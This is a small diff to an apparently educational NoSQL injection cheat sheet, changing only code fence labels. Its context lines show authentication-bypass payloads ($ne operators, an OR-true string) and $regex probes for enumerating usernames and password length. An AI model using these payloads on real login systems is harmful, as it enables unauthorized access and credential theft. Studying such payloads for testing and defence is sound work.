@@ -40,7 +40,7 @@ admin' || '1'=='1
 ```
 * Operators
 
-```JS
+```js
 # $ne: Not equal
 username[$ne]=xyz&password[$ne]=xyz
 
@@ -77,7 +77,7 @@ username[$regex]=.{6}&password[$ne]=xyz
 
 After finding usernames, we can also obtain the passwords using the “$regex” operator as the following example.
 
-```JS
+```js
 # Check if the password length is 7 characters.
 username=admin&password[$regex]=^.{7}$
 # If not, change 7 to 6 (or 8 or something number).
